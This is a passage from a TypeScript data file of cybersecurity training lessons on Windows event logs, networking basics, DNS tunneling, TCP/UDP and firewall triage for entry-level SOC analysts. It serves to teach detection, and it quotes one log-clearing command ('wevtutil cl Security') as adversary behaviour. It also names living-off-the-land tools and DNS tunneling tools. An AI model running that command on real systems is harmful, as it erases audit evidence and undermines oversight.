            { id: 'log-subject', label: 'SUBJECT SID' },
            { id: 'log-process', label: 'PROCESS CLI' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: LOG STORAGE',
          subPillar: 'WINEVT REPOSITORY & CHANNELS',
          heading: 'Windows Event Log Vault (C:\\Windows\\System32\\winevt)',
          paragraph1:
            'Windows stores records in protected channels: Security.evtx (authentications, audit policies), System.evtx (drivers, reboots), and Application.evtx.',
          paragraph2:
            'The Event Log service maintains circular write-ahead buffers. Standard users cannot read or delete Security.evtx—only SYSTEM and Administrators have audit read rights.',
          techBoxTitle: 'TECH BOX: Event Channels & Access Control [Details]',
          techBoxAnalogy: 'Like an airplane black box flight recorder: engineered to continuously write telemetry and sealed against tampering.',
          techBoxDef: 'Windows Event Log Vault (.evtx) is the protected kernel-level logging architecture storing structured binary XML audit records across channels.',
          techBoxWhy: 'Adversaries attempt to clear logs using "wevtutil cl Security" or Event ID 1102. An abrupt clearing of logs is an immediate Severity 1 alarm.',
          defaultAnimation: 'm01-log-vault' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'vault-sec', label: 'SECURITY.EVTX' },
            { id: 'vault-sys', label: 'SYSTEM.EVTX' },
            { id: 'vault-app', label: 'APPLICATION.EVTX' },
            { id: 'vault-service', label: 'EVENTLOG SERVICE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: FORWARDING',
          subPillar: 'CENTRALIZED AUDIT PIPELINE',
          heading: 'Log Forwarding & Tamper Defense',
          paragraph1:
            'To prevent adversaries from erasing evidence, workstations immediately forward logs across the network to central SIEM log collectors.',
          paragraph2:
            'Once a log entry leaves the workstation, an attacker on the endpoint cannot rewrite or erase it from the central data lake, preserving immutable evidence.',
          techBoxTitle: 'TECH BOX: Centralized Forwarding & Immutability [Details]',
          techBoxAnalogy: 'Like sending a registered letter with tracking: once handed to the post office courier, the sender cannot sneak it back or alter the signature.',
          techBoxDef: 'Centralized Log Forwarding streams local host events across encrypted conduits to remote repositories (SIEM/WEC) to guarantee audit permanence.',
          techBoxWhy: 'Ensures that even if an attacker successfully formats or overwrites an endpoint hard drive, the forensic evidence remains intact in the SIEM.',
          defaultAnimation: 'm01-log-forwarding' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'fwd-wef', label: 'HOST WEF' },
            { id: 'fwd-tls', label: 'TLS CONDUIT' },
            { id: 'fwd-siem', label: 'CENTRAL SIEM' },
            { id: 'fwd-immutable', label: 'IMMUTABLE 🛡️' },
          ],
        },
      ];
    }

    // 5. M01-U3-C1: Core networking for host communication
    if (chId === 'M01-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: ADDRESSING',
          subPillar: 'IP VS MAC ARCHITECTURE',
          heading: 'Physical MAC vs Logical IP Addressing',
          paragraph1:
            'Mentor Ravi explains how workstations communicate: "A MAC address is like your physical fingerprint burned into the network card; an IP address is your postal mailing address."',
          paragraph2:
            'Workstations use local IP addresses (10.10.20.15) to identify themselves inside the office, routing packets through the default gateway to reach external destinations.',
          techBoxTitle: 'TECH BOX: Layer 2 Physical vs Layer 3 Logical Addressing [Details]',
          techBoxAnalogy: 'Your national identity number or fingerprint is permanent (MAC); your current apartment street address changes when you move (IP).',
          techBoxDef: 'MAC Address provides physical hardware Layer 2 addressing; IP Address provides logical Layer 3 hierarchical routing across interconnected networks.',
          techBoxWhy: 'Adversaries can spoof IP addresses, but correlating ARP tables and switch port MAC bindings helps analysts trace the exact physical network port.',
          defaultAnimation: 'm01-mac-ip-addressing' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'net-mac', label: 'PHYSICAL MAC' },
            { id: 'net-ip', label: 'LOGICAL IP' },
            { id: 'net-arp', label: 'ARP TABLE' },
            { id: 'net-gw', label: 'GATEWAY ROUTER' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: PORTS',
          subPillar: 'PORTS & SOCKET HANDSHAKE',
          heading: 'Workstation Ports & TCP 3-Way Handshake',
          paragraph1:
            'An IP address finds the computer; a port number finds the specific program waiting inside. Web servers listen on port 443 (HTTPS), while DNS listens on port 53.',
          paragraph2:
            'Before data flows over TCP, a 3-way handshake takes place: SYN (connect?), SYN-ACK (ready!), and ACK (established!). This establishes a reliable, error-checked connection.',
          techBoxTitle: 'TECH BOX: TCP Handshake & Port Sockets [Details]',
          techBoxAnalogy: 'Calling someone on the phone: you dial and hear it ring (SYN), they answer and say hello (SYN-ACK), and you reply "Hi, can you hear me?" (ACK).',
          techBoxDef: 'TCP 3-Way Handshake establishes a reliable socket connection between client ephemeral port and server listening port with synchronized sequence numbers.',
          techBoxWhy: 'Incomplete handshakes (SYN floods) or connections on non-standard ports (like port 443 transmitting plain unencrypted text) indicate malicious tunnels.',
          defaultAnimation: 'm01-tcp-handshake' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'tcp-syn', label: '1. SYN' },
            { id: 'tcp-synack', label: '2. SYN-ACK' },
            { id: 'tcp-ack', label: '3. ACK' },
            { id: 'tcp-established', label: 'ESTABLISHED ✓' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: CONDUIT',
          subPillar: 'CLIENT-SERVER COMMUNICATION',
          heading: 'The Client-Server Request Cycle',
          paragraph1:
            'When an employee opens a browser, the workstation queries DNS to resolve the hostname, opens an encrypted TLS socket, and transmits an HTTP GET request.',
          paragraph2:
            'The remote web server processes the request and responds with encrypted web data. Analysts trace this full request/response cycle to verify whether connections were benign.',
          techBoxTitle: 'TECH BOX: Client-Server Protocol Flow [Details]',
          techBoxAnalogy: 'Like ordering at a restaurant counter: client places food request, server kitchen prepares order, and delivers finished tray.',
          techBoxDef: 'Client-Server Architecture divides tasks between service requesters (clients) and centralized resource providers (servers) over standard network protocols.',
          techBoxWhy: 'Command-and-control (C2) implants turn workstations into rogue clients beaconing out to adversary servers at regular mathematical intervals.',
          defaultAnimation: 'm01-client-server-flow' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'cs-dns', label: '1. DNS LOOKUP' },
            { id: 'cs-tls', label: '2. TLS HANDSHAKE' },
            { id: 'cs-req', label: '3. HTTP GET' },
            { id: 'cs-resp', label: '4. HTTP 200 OK' },
          ],
        },
      ];
    }

    // 6. M01-U3-C2: Distinguishing normal workstation behavior from anomalies
    if (chId === 'M01-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: BASELINE',
          subPillar: 'WORKSTATION BASELINE PROFILE',
          heading: 'Distinguishing Normal Behavior from Anomalies',
          paragraph1:
            'Mentor Ravi explains the core principle of triage: "Before we decide whether a computer is doing something unusual, let us understand what it normally does."',
          paragraph2:
            'Workstation BLR-BR-WS-04 normally operates between 9 AM and 5 PM, runs signed finance accounting software, generates low CPU load, and talks only to corporate gateways.',
          techBoxTitle: 'TECH BOX: Behavioral Baselines & Deviation Scoring [Details]',
          techBoxAnalogy: 'Like your heartbeat: a resting pulse of 70 BPM is normal; suddenly spiking to 180 BPM while sleeping indicates an urgent emergency.',
          techBoxDef: 'A Baseline represents the documented normal operational profile of an endpoint—including typical operating hours, standard processes, and expected network bandwidth.',
          techBoxWhy: 'Without a baseline, analysts mistake legitimate administrative batch jobs for attacks, or fail to notice slow, low-and-slow data exfiltration.',
          defaultAnimation: 'm01-workstation-baseline' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'base-hours', label: 'HOURS (9-5)' },
            { id: 'base-apps', label: 'SIGNED APPS' },
            { id: 'base-cpu', label: 'CPU (<15%)' },
            { id: 'base-net', label: 'INTERNAL SUBNET' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: ANOMALY',
          subPillar: 'DETECTION TRIGGERS & LOLBINS',
          heading: 'Anomaly Triggers: Off-Hours & Living Off The Land',
          paragraph1:
            'An anomaly occurs when behavior sharply diverges from baseline: a user account logging in at 2:30 AM on a Sunday, or an encoded PowerShell command downloading an unknown file.',
          paragraph2:
            'Adversaries use built-in Windows utilities (LOLBINs like certutil.exe or bitsadmin.exe) to hide in plain sight. An alert triggers when these tools connect to unapproved external IPs.',
          techBoxTitle: 'TECH BOX: Anomaly Triangulation & LOLBIN Detection [Details]',
          techBoxAnalogy: 'Seeing a maintenance worker in uniform carrying tools during office hours is normal; seeing someone in a hoodie prying open filing cabinets at 3 AM is an anomaly.',
          techBoxDef: 'An Anomaly is an observable divergence from established baseline behavior that exceeds statistical thresholds or matches threat detection rules.',
          techBoxWhy: 'Living Off The Land (LOLBIN) attacks bypass signature antivirus because the executable itself is a legitimate, signed Microsoft utility.',
          defaultAnimation: 'm01-anomaly-triggers' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'anom-offhours', label: 'OFF-HOURS ⚠️' },
            { id: 'anom-lolbin', label: 'LOLBIN ⚠️' },
            { id: 'anom-spike', label: 'TRAFFIC SPIKE' },
            { id: 'anom-beacon', label: 'C2 BEACON' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: TRIAGE',
          subPillar: 'DECISION MATRIX & CONTAINMENT',
          heading: 'The L1 Triage Decision Matrix',
          paragraph1:
            'When an anomaly alert fires, the L1 analyst triangulates three questions: Is this expected business activity? Has this user done this before? Does the file hash match threat intelligence?',
          paragraph2:
            'If verified as a True Positive, the analyst immediately triggers host isolation to protect the network. If confirmed as authorized maintenance, the alert is closed with clear documentation.',
          techBoxTitle: 'TECH BOX: True vs False Positive Decision Matrix [Details]',
          techBoxAnalogy: 'Like a smoke alarm: verify whether someone is simply burning toast in the breakroom (False Positive) or if there is an active electrical fire in the ceiling (True Positive).',
          techBoxDef: 'Triage Decision Matrix is the formal, repeatable evaluation procedure by which an analyst determines alert validity, records evidence, and executes containment protocols.',
          techBoxWhy: 'Consistent, repeatable triage prevents alert fatigue and ensures confirmed breaches are contained within the 15-minute SLA.',
          defaultAnimation: 'm01-triage-matrix' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'tri-alert', label: '1. INTAKE' },
            { id: 'tri-check', label: '2. 3-PT CHECK' },
            { id: 'tri-fp', label: 'FP: DOCUMENT' },
            { id: 'tri-tp-isolate', label: 'TP: ISOLATE 🔒' },
          ],
        },
      ];
    }

    // =========================================================================
    // MODULE 02: NETWORKING FUNDAMENTALS (Master Story Blueprint)
    // =========================================================================

    // 7. M02-U1-C1: IP addresses, masks and gateways
    if (chId === 'M02-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: ADDRESSING',
          subPillar: 'SUBNET MASKS & NETWORK BOUNDARIES',
          heading: 'Subnetting: Local Segment vs External World',
          paragraph1:
            'Mentor Ravi guides you through the branch network: "Devices use network addresses to communicate. A subnet mask helps determine which addresses are local to your switch and which require a router."',
          paragraph2:
            'With a /24 subnet mask (255.255.255.0), the first three octets (10.10.20) define the local room. A destination on 10.10.20.50 is reached directly over the switch; a destination on 10.10.10.5 must be sent to the default gateway.',
          techBoxTitle: 'TECH BOX: CIDR Notation & Subnet Boundaries [Details]',
          techBoxAnalogy: 'Like an internal office extension versus an international phone line: you can dial a 3-digit number to reach your desk neighbor, but need an outside line prefix to call another city.',
          techBoxDef: 'A Subnet Mask is a 32-bit bitmask that separates the IP address into network prefix bits and host identifier bits, establishing local broadcast domain boundaries.',
          techBoxWhy: 'Adversaries exploit misconfigured subnets to perform ARP spoofing and broadcast sniffing across departments that should have been isolated.',
          defaultAnimation: 'm02-subnet-calculator' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'sub-netbits', label: 'NETWORK BITS' },
            { id: 'sub-hostbits', label: 'HOST POOL' },
            { id: 'sub-mask', label: 'SUBNET MASK' },
            { id: 'sub-bcast', label: 'BROADCAST' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: GATEWAY',
          subPillar: 'DEFAULT GATEWAY BORDER CROSSING',
          heading: 'The Default Gateway: Exit to Other Networks',
          paragraph1:
            'Ravi asks: "Where does a workstation send traffic intended for a different network?" The learner answers: "To its default gateway."',
          paragraph2:
            'The default gateway (10.10.20.1) is the router interface connecting the local branch floor to corporate servers, cloud providers, and the wider internet.',
          techBoxTitle: 'TECH BOX: Default Gateway & Next-Hop Routing [Details]',
          techBoxAnalogy: 'Like the exit passport control checkpoint at an international airport: you can roam freely inside the terminal, but must pass through the gate to travel abroad.',
          techBoxDef: 'Default Gateway is the designated Layer 3 router IP address that a host forwards non-local IP packets to when no explicit route exists.',
          techBoxWhy: 'Malicious actors attempt "gateway spoofing" (Rogue DHCP) to trick hosts into sending all outbound traffic through the attacker\'s intercept machine.',
          defaultAnimation: 'm02-default-gateway' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'gw-host', label: 'HOST (BLR-BR-WS-04)' },
            { id: 'gw-router', label: 'GATEWAY ROUTER' },
            { id: 'gw-routing', label: 'FORWARDING' },
            { id: 'gw-dest', label: 'DESTINATION' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: IDENTITY',
          subPillar: 'NAT & EPHEMERAL IP IDENTITY',
          heading: 'Network Address Translation & IP Ephemerality',
          paragraph1:
            'The learner asks: "Is an IP address a permanent name for a person?" Mentor Ravi shakes his head: "No. It identifies a network endpoint in context and may change or be shared through translation."',
          paragraph2:
            'Network Address Translation (NAT) maps private internal addresses (10.10.20.15) to shared public IP addresses (203.0.113.50). An IP address observed in a log is an ephemeral locator, not human attribution.',
          techBoxTitle: 'TECH BOX: NAT & IP Identity in Investigations [Details]',
          techBoxAnalogy: 'Like the main reception switchboard number of a hospital: incoming calls show only the hospital number, not the specific doctor\'s room extension.',
          techBoxDef: 'Network Address Translation (RFC 3022) modifies network address information in IP packet headers while in transit across a traffic routing device.',
          techBoxWhy: 'L1 analysts must never claim "User X is guilty because their IP appeared in firewall logs" without verifying historical DHCP leases and NAT translation state tables.',
          defaultAnimation: 'm02-nat-translation' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'nat-private', label: 'PRIVATE IP' },
            { id: 'nat-table', label: 'NAT TABLE' },
            { id: 'nat-public', label: 'PUBLIC IP' },
            { id: 'nat-ephemeral', label: 'EPHEMERAL LEASE' },
          ],
        },
      ];
    }

    // 8. M02-U1-C2: Switches, routers and access points
    if (chId === 'M02-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: WIRELESS',
          subPillar: 'ACCESS POINT & RF BRIDGE',
          heading: 'Access Points: Bridging Airwaves to Copper Wire',
          paragraph1:
            'A finance laptop joins the branch Wi-Fi. Mentor Ravi explains: "An access point connects wireless clients; a switch connects local devices; a router forwards between networks."',
          paragraph2:
            'The Access Point (AP) converts 802.11 radio frequency (RF) frames into 802.3 Ethernet copper signals, injecting packets onto the physical LAN switch.',
          techBoxTitle: 'TECH BOX: 802.11 Wireless to 802.3 Ethernet Bridge [Details]',
          techBoxAnalogy: 'Like a language translator at a summit: translating spoken verbal speeches (wireless airwaves) into written diplomatic letters (copper wire).',
          techBoxDef: 'A Wireless Access Point (WAP) is a networking hardware device that allows other Wi-Fi devices to connect to a wired network via radio frequencies.',
          techBoxWhy: 'Rogue APs or "Evil Twin" hotspots impersonate enterprise Wi-Fi (BLR-STAFF-WIFI) to harvest plaintext credentials from connecting employee laptops.',
          defaultAnimation: 'm02-access-point' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'ap-client', label: 'LAPTOP WI-FI' },
            { id: 'ap-rf', label: 'RF WAVES (WPA3)' },
            { id: 'ap-bridge', label: 'AP BRIDGE' },
            { id: 'ap-uplink', label: 'COPPER UPLINK' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: SWITCHING',
          subPillar: 'CAM TABLE & UNICAST FORWARDING',
          heading: 'Layer 2 Switches: Learning Ports & Forwarding',
          paragraph1:
            'Switches build a Content Addressable Memory (CAM) table by reading the Source MAC address of every arriving frame and recording which physical port it arrived on.',
          paragraph2:
            'Once learned, the switch forwards frames directly to the intended destination port without broadcasting to the rest of the branch floor, ensuring confidentiality and efficiency.',
          techBoxTitle: 'TECH BOX: Switch CAM Tables & MAC Learning [Details]',
          techBoxAnalogy: 'Like a receptionist learning which employee sits at which desk: once known, visitors are directed straight to that office instead of paging the entire building.',
          techBoxDef: 'A Network Switch operates at Layer 2 (Data Link), using hardware CAM tables to inspect destination MAC addresses and switch frames to designated physical ports.',
          techBoxWhy: 'CAM table overflow attacks flood a switch with bogus MAC addresses, forcing it into "fail-open" hub mode where all traffic is broadcast for easy sniffing.',
          defaultAnimation: 'm02-switch-cam' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'cam-port1', label: 'PORT 1 (HOST)' },
            { id: 'cam-table', label: 'CAM TABLE' },
            { id: 'cam-port4', label: 'PORT 4 (SERVER)' },
            { id: 'cam-flooding', label: 'FLOOD DEFENSE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: ROUTING',
          subPillar: 'LAYER 3 PACKET FORWARDING',
          heading: 'Routers: Making Decisions Between Networks',
          paragraph1:
            'Ravi asks: "Which function makes a forwarding decision between IP networks?" The learner answers: "Routing." Ravi approves: "Right. Learn the function, not just the shape of a box."',
          paragraph2:
            'A router examines the destination IP address, consults its routing table for the longest prefix match, decrements the Time to Live (TTL) counter, and transmits the packet toward its destination.',
          techBoxTitle: 'TECH BOX: IP Routing Tables & TTL Decrementing [Details]',
          techBoxAnalogy: 'Like highway direction signs at a major cloverleaf interchange: reading the destination city and pointing cars down the correct interstate lane.',
          techBoxDef: 'A Router operates at Layer 3 (Network), forwarding data packets between computer networks based on IP destination addresses and routing tables.',
          techBoxWhy: 'Routers decrement TTL to prevent packets from looping endlessly during routing failures. An observed TTL of 1 or 2 can indicate packet routing anomalies.',
          defaultAnimation: 'm02-router-forwarding' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'rtr-ingress', label: 'INGRESS ETH0' },
            { id: 'rtr-table', label: 'ROUTING TABLE' },
            { id: 'rtr-ttl', label: 'TTL DECREMENT' },
            { id: 'rtr-egress', label: 'EGRESS ETH1' },
          ],
        },
      ];
    }

    // 9. M02-U2-C1: DNS and DHCP
    if (chId === 'M02-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: DHCP',
          subPillar: 'DORA HANDSHAKE & LEASE DURATION',
          heading: 'DHCP: Dynamic Configuration & Historical Leases',
          paragraph1:
            'When BLR-BR-WS-04 boots up, it executes the DORA sequence: Discover (broadcast), Offer, Request, and Acknowledgment to obtain IP 10.10.20.15 for an 8-hour lease.',
          paragraph2:
            'Mentor Ravi emphasizes: "Can today\'s address assignment prove who held the address last week? No. I need the historical lease for the relevant time. Network identity depends on time as well as an address."',
          techBoxTitle: 'TECH BOX: DHCP DORA & Temporal Attribution [Details]',
          techBoxAnalogy: 'Like renting a hotel room: the keycard works only for your booked stay; looking at who is in Room 204 today does not tell you who stayed there last Friday.',
          techBoxDef: 'Dynamic Host Configuration Protocol (DHCP) automatically assigns IP addresses, subnet masks, default gateways, and DNS resolvers to network clients.',
          techBoxWhy: 'Rogue DHCP servers can offer malicious DNS addresses to redirect all branch web browsing to adversary phishing clones.',
          defaultAnimation: 'm02-dhcp-dora' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'dhcp-discover', label: '1. DISCOVER' },
            { id: 'dhcp-offer', label: '2. OFFER' },
            { id: 'dhcp-request', label: '3. REQUEST' },
            { id: 'dhcp-ack', label: '4. ACK (8H LEASE)' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: DNS',
          subPillar: 'HIERARCHICAL TREE RESOLUTION',
          heading: 'DNS: The Internet Phonebook Hierarchy',
          paragraph1:
            'When a finance employee opens portal.cdac.local, the host sends a UDP 53 query to corporate resolver 10.10.10.5 to resolve the hostname into an IP address.',
          paragraph2:
            'The DNS hierarchy moves from Root hints (.) to Top-Level Domains (.local / .org) down to Authoritative Servers, caching answers locally to speed future requests.',
          techBoxTitle: 'TECH BOX: DNS Hierarchy & Cache Resolution [Details]',
          techBoxAnalogy: 'Like looking up a resident in a city directory: first find the district, then the street, then the exact house number.',
          techBoxDef: 'Domain Name System (DNS) is a hierarchical distributed naming system that translates human-friendly domain names to numerical IP addresses.',
          techBoxWhy: 'DNS cache poisoning (Kaminsky attack) inserts fraudulent IP addresses into resolvers to misdirect users to malicious counterfeit servers.',
          defaultAnimation: 'm02-dns-resolution' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'dns-client', label: 'CLIENT QUERY' },
            { id: 'dns-resolver', label: 'RESOLVER (10.10.10.5)' },
            { id: 'dns-authoritative', label: 'AUTHORITATIVE' },
            { id: 'dns-record', label: 'A RECORD ANSWER' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: TRIAGE',
          subPillar: 'DNS TUNNELING & EXFILTRATION',
          heading: 'DNS Triage: Spotting Data Smuggling & C2',
          paragraph1:
            'Because firewalls almost always allow outbound UDP 53 for name resolution, adversaries abuse DNS to tunnel data out of locked networks.',
          paragraph2:
            'Legitimate DNS queries are short and human-readable (finance.cdac.local). Malicious tunneling queries feature abnormally long subdomains packed with high-entropy Base64 data.',
          techBoxTitle: 'TECH BOX: DNS Tunneling & Exfiltration Indicators [Details]',
          techBoxAnalogy: 'Like hiding stolen diamond fragments inside ordinary greeting card envelopes: the envelope passes mail inspection, but the contents are toxic.',
          techBoxDef: 'DNS Tunneling encapsulates non-DNS data inside DNS query and response packets, bypassing perimeter firewalls to establish C2 or exfiltrate data.',
          techBoxWhy: 'L1 analysts monitor query length, volume spikes, and Shannon entropy scores to catch DNS tunneling tools like iodine or dnscat2.',
          defaultAnimation: 'm02-dns-tunneling' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'dns-benign', label: 'BENIGN QUERY' },
            { id: 'dns-tunnel', label: 'TUNNEL QUERY ⚠️' },
            { id: 'dns-entropy', label: 'ENTROPY SCORE' },
            { id: 'dns-sinkhole', label: 'SINKHOLE' },
          ],
        },
      ];
    }

    // 10. M02-U2-C2: Ports, TCP and UDP
    if (chId === 'M02-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: PORTS',
          subPillar: 'SERVICE DOORS & PORT CONTEXT',
          heading: 'Service Doors: Why Port 443 Does Not Equal Safe',
          paragraph1:
            'Learner asks: "Does port 443 prove the traffic is safe web browsing?" Mentor Ravi answers firmly: "No. A common port suggests an expected service, not a safety verdict. Applications can run on unexpected ports."',
          paragraph2:
            'Ports (0–65535) direct traffic to specific services. While Port 443 is registered for HTTPS, adversaries frequently run encrypted command-and-control tunnels through Port 443 to blend with regular traffic.',
          techBoxTitle: 'TECH BOX: Port Numbers & Service Verification [Details]',
          techBoxAnalogy: 'Like apartment door numbers: Door 443 is labeled "Accounting Office", but anyone can sneak inside and conduct illicit meetings behind that door.',
          techBoxDef: 'A Network Port is a 16-bit number identifying a specific process or service on a host. Standard ports include 22 (SSH), 53 (DNS), 80 (HTTP), and 443 (HTTPS).',
          techBoxWhy: 'Adversaries use common ports to bypass simple port-based firewall filters. Analysts must verify application-layer protocol signatures (ALPN / TLS SNI).',
          defaultAnimation: 'm02-port-doors' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'door-22', label: 'PORT 22 (SSH)' },
            { id: 'door-53', label: 'PORT 53 (DNS)' },
            { id: 'door-80', label: 'PORT 80 (HTTP)' },
            { id: 'door-443', label: 'PORT 443 (HTTPS)' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: TCP',
          subPillar: 'STATE MACHINE & SYN FLOODS',
          heading: 'TCP State Machine & Connection Tracking',
          paragraph1:
            'Ravi asks: "Which transport has the familiar three-way connection handshake?" The learner answers: "TCP." TCP tracks connection states: CLOSED, SYN_SENT, ESTABLISHED, and FIN_WAIT.',
          paragraph2:
            'Stateful firewalls and EDR agents track these state transitions. A sudden surge in incomplete handshakes (SYN sent without completing ACK) reveals a SYN Flood denial-of-service attack.',
          techBoxTitle: 'TECH BOX: TCP States & SYN Flood Attacks [Details]',
          techBoxAnalogy: 'Like booking restaurant tables: someone calls and reserves 100 tables (SYN), the host holds them open (SYN-ACK), but the caller never shows up (no ACK).',
          techBoxDef: 'Transmission Control Protocol (TCP) is a connection-oriented transport protocol maintaining state tables and sequence numbers for guaranteed delivery.',
          techBoxWhy: 'SYN flood attacks exhaust server connection queues (backlog buffer), causing legitimate financial transactions to fail.',
          defaultAnimation: 'm02-tcp-state' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'tcp-synsent', label: 'SYN_SENT' },
            { id: 'tcp-established', label: 'ESTABLISHED' },
            { id: 'tcp-fin', label: 'FIN_WAIT' },
            { id: 'tcp-synflood', label: 'SYN FLOOD ⚠️' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: UDP',
          subPillar: 'UDP SPEED VS TCP RELIABILITY',
          heading: 'UDP vs TCP: The Speed vs Guarantee Tradeoff',
          paragraph1:
            'TCP guarantees that every single packet arrives in order, retransmitting missing pieces automatically. This makes TCP ideal for financial spreadsheets, invoices, and databases.',
          paragraph2:
            'UDP is connectionless and lightweight—packets are fired into the network without handshakes or acknowledgments. This speed makes UDP perfect for real-time VoIP voice calls and quick DNS lookups.',
          techBoxTitle: 'TECH BOX: TCP vs UDP Protocol Comparison [Details]',
          techBoxAnalogy: 'TCP is like registered post requiring signed delivery receipts; UDP is like throwing flyers out of a parade float: fast and broad, but some flyers land on the street.',
          techBoxDef: 'User Datagram Protocol (UDP) is a connectionless transport protocol providing minimal protocol mechanisms with no sequencing or retransmission guarantees.',
          techBoxWhy: 'Adversaries exploit UDP\'s connectionless nature for DNS amplification attacks because UDP source IP addresses can be easily spoofed.',
          defaultAnimation: 'm02-udp-vs-tcp' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'race-tcp', label: 'TCP PIPELINE' },
            { id: 'race-retrans', label: 'RETRANSMISSION' },
            { id: 'race-udp', label: 'UDP STREAM' },
            { id: 'race-usecase', label: 'USE CASES' },
          ],
        },
      ];
    }

    // 11. M02-U3-C1: Small branch: staff devices, switch, router/firewall, Wi-Fi and shared services
    if (chId === 'M02-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: TOPOLOGY',
          subPillar: 'SMALL BRANCH SERVICE MAP',
          heading: 'The Small Branch Topology: Devices & Connections',
          paragraph1:
            'Mentor Ravi unfolds the physical service map of CDAC Bengaluru branch: Staff laptop BLR-BR-WS-04, a ceiling access point, a 24-port switch, a perimeter router/firewall, and a department file server.',
          paragraph2:
            'Understanding this layout allows analysts to trace where packets physically travel before deciding whether network telemetry represents benign business operations or an intrusion.',
          techBoxTitle: 'TECH BOX: Small Branch Network Architecture [Details]',
          techBoxAnalogy: 'Like a floor plan of a bank branch: showing where the tellers sit, where the vault is located, and which security gates connect them.',
          techBoxDef: 'Branch Network Topology defines the physical and logical arrangement of endpoints, access switches, perimeter firewalls, and shared services.',
          techBoxWhy: 'Without an accurate branch topology map, analysts cannot tell whether a server IP is a local branch appliance or an external internet destination.',
          defaultAnimation: 'm02-small-branch-map' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'br-workstation', label: 'BLR-BR-WS-04' },
            { id: 'br-switch', label: 'BRANCH SWITCH' },
            { id: 'br-firewall', label: 'PERIMETER FW' },
            { id: 'br-server', label: 'SHARED SERVER' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: POLICY',
          subPillar: 'STATEFUL FIREWALL ENFORCEMENT',
          heading: 'Firewall Policy: Allow, Drop and Default Deny',
          paragraph1:
            'Ravi explains: "The firewall applies traffic policy. Its records tell us whether a connection was allowed or blocked." Rules are evaluated from top to bottom.',
          paragraph2:
            'Rule 101 explicitly permits finance staff to access the shared finance server on TCP 443; Rule 999 is the Default Deny rule blocking all unapproved traffic and generating security logs.',
          techBoxTitle: 'TECH BOX: Stateful Firewall Policy Tables [Details]',
          techBoxAnalogy: 'Like a security bouncer holding a guest list: Rule 1 lets VIP guests enter; Rule 2 lets caterers enter; Rule 3 turns everyone else away at the door.',
          techBoxDef: 'A Stateful Firewall tracks the operational state of active network connections and compares packet headers against an ordered access control list (ACL).',
          techBoxWhy: 'Default-deny is the cornerstone of network defense. If an adversary attempts lateral movement on an unapproved port, the default-deny rule drops it.',
          defaultAnimation: 'm02-firewall-rules' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'fw-rule1', label: 'RULE 101: ALLOW' },
            { id: 'fw-rule2', label: 'RULE 102: DNS' },
            { id: 'fw-rule99', label: 'DEFAULT DENY' },
            { id: 'fw-log', label: 'CONNECTION LOG' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: TRIANGULATION',
          subPillar: 'NETWORK ALLOWED VS APP SUCCESS',
          heading: 'Triangulation: Network Permit vs Application Success',
          paragraph1:
            'Learner asks: "If the firewall log says allowed, did the application definitely complete the task?" Mentor Ravi cautions: "No. A permitted connection and a successful application operation are different observations."',
          paragraph2:
            'A firewall log proves that TCP handshakes were permitted through the gate. However, the web server may crash with HTTP 500 or reject the credentials with HTTP 403. Analysts must correlate both layers.',
          techBoxTitle: 'TECH BOX: Network Telemetry vs Application Ground Truth [Details]',
          techBoxAnalogy: 'Like entering a library: the front door security guard lets you through the turnstile (Network Allowed), but the specific book you wanted might be missing from the shelf (Application 404).',
          techBoxDef: 'Multi-Layer Triangulation correlates Layer 4 network session telemetry with Layer 7 application execution logs to verify end-to-end transaction integrity.',
          techBoxWhy: 'Attackers sometimes exploit web applications by sending malformed payloads over permitted ports; the firewall reports "Allowed", but application logs reveal the exploit.',
          defaultAnimation: 'm02-policy-vs-app' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'chk-netallow', label: 'FW: ALLOWED (L4)' },
            { id: 'chk-apperr', label: 'APP: CRASH (L7)' },
